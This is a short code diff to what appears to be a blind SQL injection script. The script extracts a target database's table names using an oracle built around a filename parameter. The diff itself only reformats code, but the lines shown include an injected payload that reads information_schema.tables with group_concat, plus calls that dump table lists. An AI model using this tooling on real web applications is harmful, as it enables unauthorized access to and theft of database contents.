@@ -9,6 +9,7 @@ ORACLE (row 3, filename test.jpg which never fetches):
 
 Everything below is fully URL-encoded and builds on this oracle.
 """
+
 import json
 import os
 import sys
@@ -112,9 +113,9 @@ def main():
     elif what == "tables":
         extract_str("tables", "group_concat(table_name)", 500)
     elif what == "tables_all":
-        extract_str("tables_all",
-                    "(SELECT+group_concat(table_schema||'.'||table_name)+FROM+information_schema.tables)",
-                    800)
+        extract_str(
+            "tables_all", "(SELECT+group_concat(table_schema||'.'||table_name)+FROM+information_schema.tables)", 800
+        )
     else:
         print("unknown:", what)
 
